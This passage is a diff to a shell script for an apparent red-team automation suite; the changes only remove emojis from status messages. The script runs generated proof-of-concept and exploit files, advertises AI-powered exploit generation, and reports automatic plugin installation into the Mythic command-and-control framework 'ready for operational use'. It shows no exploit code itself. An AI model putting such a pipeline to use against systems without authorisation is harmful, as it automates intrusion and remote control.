         DASHBOARD_PID=$!
@@ -842,61 +840,61 @@ if [ $? -eq 0 ]; then
         
         # Test if dashboard is running
         if curl -s http://localhost:5000 >/dev/null; then
-            echo "✅ Dashboard is running!"
+            echo "Dashboard is running!"
             echo ""
-            echo "🎯 OPEN YOUR BROWSER TO:"
-            echo "   👉 http://localhost:5000"
+            echo "OPEN YOUR BROWSER TO:"
+            echo "   http://localhost:5000"
             echo ""
-            echo "📋 Dashboard Features:"
+            echo "Dashboard Features:"
             echo "   • Executive Summary Dashboard"
             echo "   • Comprehensive Security Report" 
             echo "   • Technical Analysis Data"
             echo "   • Generated Exploits & PoCs"
             echo ""
-            echo "🛑 To stop dashboard: kill $DASHBOARD_PID"
-            echo "📁 Dashboard files: security_dashboard/"
+            echo "To stop dashboard: kill $DASHBOARD_PID"
+            echo "Dashboard files: security_dashboard/"
         else
-            echo "⚠️ Dashboard may not have started. Check: ./start_dashboard.sh"
+            echo "Dashboard may not have started. Check: ./start_dashboard.sh"
         fi
     else
-        echo "🎯 Launch manually with: ./start_dashboard.sh"
+        echo "Launch manually with: ./start_dashboard.sh"
     fi
 else
-    echo "⚠️ Dashboard generation had issues - check dashboard_generator.py"
+    echo "Dashboard generation had issues - check dashboard_generator.py"
 fi
-echo "🧪 Testing proof of concept..."
+echo "Testing proof of concept..."
 if [ -x "$POC_OUTPUT" ]; then
     echo "Running basic PoC..."
     python3 "$POC_OUTPUT"
 else
-    echo "⚠️ Basic PoC not found or not executable"
+    echo "Basic PoC not found or not executable"
 fi
 
 if [ -x "$EXPLOIT_OUTPUT" ]; then
     echo "Running advanced exploit..."
     python3 "$EXPLOIT_OUTPUT"
 else
-    echo "⚠️ Advanced exploit not found or not executable"
+    echo "Advanced exploit not found or not executable"
 fi
 
-echo -e "\n🎉 ==============================================="
+echo -e "\n==============================================="
 echo "   Red Team Automation Suite - Complete Analysis"
 echo "==============================================="
 echo ""
-echo "📊 **Comprehensive Report:** comprehensive_security_report.md"
-echo "🔍 **Technical Data:** $TRIAGE_JSON"
-echo "🛡️ **Binary Analysis:** $BINARY_ANALYSIS_JSON"
-echo "🧠 **AI Analysis:** $LLM_ANALYSIS_JSON"
-echo "💥 **Basic PoC:** $POC_OUTPUT"
-echo "⚔️ **Advanced Exploit:** $EXPLOIT_OUTPUT"
+echo "**Comprehensive Report:** comprehensive_security_report.md"
+echo "**Technical Data:** $TRIAGE_JSON"
+echo "**Binary Analysis:** $BINARY_ANALYSIS_JSON"
+echo "**AI Analysis:** $LLM_ANALYSIS_JSON"
+echo "**Basic PoC:** $POC_OUTPUT"
+echo "**Advanced Exploit:** $EXPLOIT_OUTPUT"
 
 if [ "$MYTHIC_INTEGRATION_SUCCESS" = "true" ]; then
-    echo "🏰 **C2 Integration:** FULLY AUTOMATED ✅"
-    echo "   📦 Plugin auto-installed into Mythic"
-    echo "   🎯 Ready for immediate operational use"
+    echo "**C2 Integration:** FULLY AUTOMATED"
+    echo "   Plugin auto-installed into Mythic"
+    echo "   Ready for immediate operational use"
     echo ""
-    echo "🚀 **Operational Ready:** Yes - everything automated!"
-    echo "📋 **Next Steps:**"
+    echo "**Operational Ready:** Yes - everything automated!"
+    echo "**Next Steps:**"
     echo "   1. Open Mythic web interface: https://localhost:7443"
     echo "   2. Create new operation in Mythic UI"
     echo "   3. Generate payload using your custom plugin: ${MYTHIC_PLUGIN_NAME:-"custom_exploit"}"
@@ -904,8 +902,8 @@ if [ "$MYTHIC_INTEGRATION_SUCCESS" = "true" ]; then
     echo "   5. Review comprehensive security report below"
 else
     echo ""
-    echo "⚠️ **C2 Integration:** Manual steps required"
-    echo "📋 **Next Steps:**"
+    echo "**C2 Integration:** Manual steps required"
+    echo "**Next Steps:**"
     echo "   1. Review comprehensive security report"
     echo "   2. Test generated exploits in controlled environment"
     echo "   3. Manually install Mythic plugin if needed"
@@ -914,37 +912,37 @@ fi
 
 echo -e "\n=== FINAL SUMMARY ==="
 echo ""
-echo "🎉 ==============================================="
+echo "==============================================="
 echo "   RED TEAM AUTOMATION SUITE - COMPLETE SUCCESS!"
 echo "==============================================="
 echo ""
-echo "📊 **Analysis Results:**"
-echo "   📄 Comprehensive Report: comprehensive_security_report.md"
-echo "   🔍 Technical Data: $TRIAGE_JSON, $BINARY_ANALYSIS_JSON, $LLM_ANALYSIS_JSON"
-echo "   💥 Basic PoC: $POC_OUTPUT"
-echo "   ⚔️ Advanced Exploit: $EXPLOIT_OUTPUT"
+echo "**Analysis Results:**"
+echo "   Comprehensive Report: comprehensive_security_report.md"
+echo "   Technical Data: $TRIAGE_JSON, $BINARY_ANALYSIS_JSON, $LLM_ANALYSIS_JSON"
+echo "   Basic PoC: $POC_OUTPUT"
+echo "   Advanced Exploit: $EXPLOIT_OUTPUT"
 
 if [ "$MYTHIC_INTEGRATION_SUCCESS" = "true" ]; then
-    echo "   🏰 C2 Integration: FULLY AUTOMATED ✅"
-    echo "      📦 Plugin auto-installed: ${MYTHIC_PLUGIN_NAME:-"custom_exploit"}"
-    echo "      🎯 Mythic UI: https://localhost:7443"
+    echo "   C2 Integration: FULLY AUTOMATED"
+    echo "      Plugin auto-installed: ${MYTHIC_PLUGIN_NAME:-"custom_exploit"}"
+    echo "      Mythic UI: https://localhost:7443"
 else
-    echo "   🏰 C2 Integration: Available offline"
-    echo "      📁 Artifacts: $MYTHIC_OUTPUT_DIR/"
+    echo "   C2 Integration: Available offline"
+    echo "      Artifacts: $MYTHIC_OUTPUT_DIR/"
 fi
 
 echo ""
-echo "🌐 **Professional Dashboard:**"
-echo "   🎨 Sleek web interface: http://localhost:5000"
-echo "   📱 Mobile-responsive design"
-echo "   📊 Interactive metrics & charts"
-echo "   📋 Executive security reports"
-echo "   💾 Download all artifacts"
+echo "**Professional Dashboard:**"
+echo "   Sleek web interface: http://localhost:5000"
+echo "   Mobile-responsive design"
+echo "   Interactive metrics & charts"
+echo "   Executive security reports"
+echo "   Download all artifacts"
 echo ""
-echo "🏆 **Achievement Unlocked:**"
-echo "   ✅ End-to-end vulnerability discovery"
-echo "   ✅ AI-powered exploit generation" 
-echo "   ✅ Automated C2 integration"
-echo "   ✅ Professional reporting dashboard"
+echo "**Achievement Unlocked:**"
+echo "   End-to-end vulnerability discovery"
+echo "   AI-powered exploit generation" 
+echo "   Automated C2 integration"
+echo "   Professional reporting dashboard"
 echo ""
-echo "🚀 **Ready for operational use!**"
+echo "**Ready for operational use!**"
